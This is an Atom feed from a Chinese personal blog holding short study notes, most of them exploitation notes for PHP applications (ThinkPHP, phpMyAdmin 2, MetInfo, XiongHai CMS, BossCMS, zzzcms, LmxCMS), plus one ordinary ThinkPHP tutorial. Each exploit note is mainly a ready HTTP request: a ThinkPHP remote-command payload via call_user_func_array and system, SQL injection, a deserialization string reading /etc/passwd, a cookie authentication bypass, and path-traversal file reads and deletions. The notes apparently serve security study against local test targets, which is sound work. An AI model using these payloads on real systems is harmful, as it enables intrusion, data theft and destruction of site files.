<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>绯鞠的博客</title>
  
  <subtitle>连蜜统治世界!!!💕</subtitle>
  <link href="https://loli.fj.cn/atom.xml" rel="self"/>
  
  <link href="https://loli.fj.cn/"/>
  <updated>2024-07-12T10:53:28.823Z</updated>
  <id>https://loli.fj.cn/</id>
  
  <author>
    <name>绯鞠</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【笔记】ThinkPHP远程代码执行漏洞利用</title>
    <link href="https://loli.fj.cn/2024/07/12/ThinkPHP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/07/12/ThinkPHP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-07-12T11:09:23.000Z</published>
    <updated>2024-07-12T10:53:28.823Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ThinkPHP远程代码执行漏洞利用</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>5.0.7 &lt;&#x3D; ThinkPHP &lt;&#x3D; 5.0.22</li><li>5.1.0 &lt;&#x3D; ThinkPHP &lt;&#x3D; 5.1.30</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p><code>&lt;shell&gt;</code>：远程执行的Shell命令</p></blockquote><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1:80/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=&lt;shell&gt;</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;ThinkPHP远程代码执行漏洞利用&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】ThinkPHPSQL注入漏洞利用</title>
    <link href="https://loli.fj.cn/2024/07/12/ThinkPHPSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/07/12/ThinkPHPSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-07-12T09:41:38.000Z</published>
    <updated>2024-07-12T10:53:28.823Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ThinkPHPSQL注入漏洞利用<br>CNVD-2017-25142</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li><p>ThinkPHP 3.2.3</p></li><li><p>使用了<code>array()</code>数组作为<code>where()</code>方法的参数</p></li><li><p>使用了<code>find()</code>方法操作数据库</p></li></ul><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="keyword">array</span>(<span class="string">&quot;key&quot;</span>, <span class="variable">$_GET</span>(<span class="string">&quot;key&quot;</span>))-&gt;<span class="title function_ invoke__">find</span>();</span><br></pre></td></tr></table></figure></div><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p><code>&lt;sql&gt;</code>：SQL注入</p></blockquote><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1:80/?key[0]=x&amp;key[1]==&lt;sql&gt;</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;ThinkPHPSQL注入漏洞利用&lt;br&gt;CNVD-2017-25142&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】ThinkPHP学习笔记</title>
    <link href="https://loli.fj.cn/2024/07/11/ThinkPHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://loli.fj.cn/2024/07/11/ThinkPHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2024-07-11T11:53:29.000Z</published>
    <updated>2024-07-12T10:53:28.823Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ThinkPHP学习笔记</p><span id="more"></span><h2 id="定义入口目录"><a href="#定义入口目录" class="headerlink" title="定义入口目录"></a>定义入口目录</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><figcaption><span>index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_PATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/app/&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h2 id="开启DEBUG"><a href="#开启DEBUG" class="headerlink" title="开启DEBUG"></a>开启DEBUG</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><figcaption><span>application/config.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">&#x27;app_debug&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;app_tract&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><figcaption><span>application/database.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">&#x27;debug&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1:80/index.php/index/test/method/</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><figcaption><span>application/index/controller/Test.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="接收请求参数"><a href="#接收请求参数" class="headerlink" title="接收请求参数"></a>接收请求参数</h2><h3 id="任意位置的请求参数"><a href="#任意位置的请求参数" class="headerlink" title="任意位置的请求参数"></a>任意位置的请求参数</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;&lt;key&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="强制转换为整数类型"><a href="#强制转换为整数类型" class="headerlink" title="强制转换为整数类型"></a>强制转换为整数类型</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;&lt;key&gt;/d&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="强制转换为浮点数类型"><a href="#强制转换为浮点数类型" class="headerlink" title="强制转换为浮点数类型"></a>强制转换为浮点数类型</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;&lt;key&gt;/f&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="强制转换为布尔类型"><a href="#强制转换为布尔类型" class="headerlink" title="强制转换为布尔类型"></a>强制转换为布尔类型</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;&lt;key&gt;/b&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="强制转换为字符串类型"><a href="#强制转换为字符串类型" class="headerlink" title="强制转换为字符串类型"></a>强制转换为字符串类型</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;&lt;key&gt;/s&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="强制转换为数组类型"><a href="#强制转换为数组类型" class="headerlink" title="强制转换为数组类型"></a>强制转换为数组类型</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;&lt;key&gt;/a&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="query"><a href="#query" class="headerlink" title="query"></a>query</h3><blockquote><p><code>&lt;key&gt;</code>：请求参数名</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;get.&lt;key&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;&lt;key&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="body"><a href="#body" class="headerlink" title="body"></a>body</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.&lt;key&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;&lt;key&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="path"><a href="#path" class="headerlink" title="path"></a>path</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;param.&lt;key&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h2 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h2><h3 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br></pre></td></tr></table></figure></div><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">db</span>(<span class="string">&#x27;&lt;database_name&gt;&#x27;</span>)-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;&lt;field_name&gt;&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="keyword">array</span>(<span class="string">&#x27;&lt;key&gt;&#x27;</span>=&gt;<span class="string">&#x27;&lt;value&gt;&#x27;</span>))-&gt;<span class="title function_ invoke__">select</span>();</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;ThinkPHP学习笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="PHP" scheme="https://loli.fj.cn/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】phpmyadmin2反序列化漏洞导致任意文件读取漏洞利用</title>
    <link href="https://loli.fj.cn/2024/07/11/phpmyadmin2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/07/11/phpmyadmin2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-07-11T10:48:57.000Z</published>
    <updated>2024-07-12T10:53:28.835Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>phpmyadmin2反序列化漏洞导致任意文件读取漏洞利用</p><span id="more"></span><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1/scripts/setup.php?configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;;s:11:&quot;/etc/passwd&quot;;&#125;&amp;action=x</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;phpmyadmin2反序列化漏洞导致任意文件读取漏洞利用&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】米拓CMS文件包含漏洞利用</title>
    <link href="https://loli.fj.cn/2024/07/11/%E7%B1%B3%E6%8B%93CMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/07/11/%E7%B1%B3%E6%8B%93CMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-07-11T10:29:55.000Z</published>
    <updated>2024-07-12T10:53:28.859Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>米拓CMS文件包含漏洞利用</p><span id="more"></span><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1:80/img/index.php?fmodule=7&amp;module=../index.php</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;米拓CMS文件包含漏洞利用&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】熊海CMS身份认证绕过</title>
    <link href="https://loli.fj.cn/2024/07/11/%E7%86%8A%E6%B5%B7CMS%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/"/>
    <id>https://loli.fj.cn/2024/07/11/%E7%86%8A%E6%B5%B7CMS%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/</id>
    <published>2024-07-11T09:57:54.000Z</published>
    <updated>2024-07-12T10:53:28.855Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>熊海CMS身份认证绕过</p><span id="more"></span><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1:80/admin/?r=index</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>user=1;</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;熊海CMS身份认证绕过&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】BossCMS未授权访问导致任意文件删除漏洞利用</title>
    <link href="https://loli.fj.cn/2024/07/11/BossCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/07/11/BossCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-07-11T09:45:03.000Z</published>
    <updated>2024-07-12T10:53:28.739Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>BossCMS未授权访问导致任意文件删除漏洞利用</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>BossCMS 版本 &lt;&#x3D; 1.1</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>即便跳转了登录页面，也会完成代码的执行</li></ul><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1:80/admin/?mold=safe&amp;part=backup&amp;func=delete&amp;id=../../../index.php</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;BossCMS未授权访问导致任意文件删除漏洞利用&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】BossCMS任意文件删除漏洞利用</title>
    <link href="https://loli.fj.cn/2024/07/11/BossCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/07/11/BossCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-07-11T09:33:39.000Z</published>
    <updated>2024-07-12T10:53:28.739Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>BossCMS任意文件删除漏洞利用</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>登录管理员后台已登录</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1:80/admin/?mold=safe&amp;part=backup&amp;func=delete&amp;id=../../../index.php</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;BossCMS任意文件删除漏洞利用&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】熊海CMS文件包含漏洞利用</title>
    <link href="https://loli.fj.cn/2024/07/10/%E7%86%8A%E6%B5%B7CMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/07/10/%E7%86%8A%E6%B5%B7CMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-07-10T18:22:20.000Z</published>
    <updated>2024-07-12T10:53:28.855Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>熊海CMS文件包含漏洞利用</p><span id="more"></span><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>被包含的文件拼接前缀<code>files/</code>和后缀<code>.php</code></li></ul><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1:80/?r=../index</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;熊海CMS文件包含漏洞利用&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】zzzcms任意文件删除漏洞利用</title>
    <link href="https://loli.fj.cn/2024/07/10/zzzcms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/07/10/zzzcms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-07-10T18:07:38.000Z</published>
    <updated>2024-07-12T10:53:28.835Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>zzzcms任意文件删除漏洞利用</p><span id="more"></span><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http://127.0.0.1:80/admin/save.php?act=delfile</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">path=/upload/../install/install.lock</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;zzzcms任意文件删除漏洞利用&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】梦想CMS任意文件读取漏洞利用</title>
    <link href="https://loli.fj.cn/2024/07/10/%E6%A2%A6%E6%83%B3CMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/07/10/%E6%A2%A6%E6%83%B3CMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-07-10T17:58:15.000Z</published>
    <updated>2024-07-12T10:53:28.855Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>梦想CMS任意文件读取漏洞利用</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>可以登录管理员后台</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p><code>../inc/db.inc.php</code>：读取的文件</p></blockquote><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1/admin.php?m=Template&amp;a=editfile&amp;dir=../inc/db.inc.php</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
